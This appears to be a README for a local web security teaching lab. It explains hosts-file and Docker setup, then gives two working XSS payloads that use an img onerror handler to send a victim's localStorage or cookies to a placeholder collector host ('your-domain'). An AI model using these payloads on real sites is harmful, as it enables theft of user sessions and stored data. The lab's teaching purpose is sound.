# Web Application Security
The application runs on the "local.dev" domain, and you should define the domain on your "hosts" file.
```shell
127.0.0.1	local.dev
```
## Where is the Hosts File Located?
- Windows 10 - `C:\Windows\System32\drivers\etc\hosts`
- Linux - `/etc/hosts`
- Mac OS X - `/private/etc/hosts`

## How to start Nginx
Run the following command to run the Nginx. Docker compose is located in the web directory
```shell
docker-compose up
```


## Sample of XSS attack
Inject the sample code below to see how the XSS attack works

### Stealing local storage
```html
<img src=x onerror=this.onerror=null;this.src='http://your-domain/gateway/api/cookie/collect.gif?cookie='+encodeURIComponent(JSON.stringify(window.localStorage)) />
```

### Stealing insecure cookie
```html
<img src=x onerror=this.onerror=null;this.src='http://your-domain/gateway/api/cookie/collect.gif?cookie='+document.cookie />
```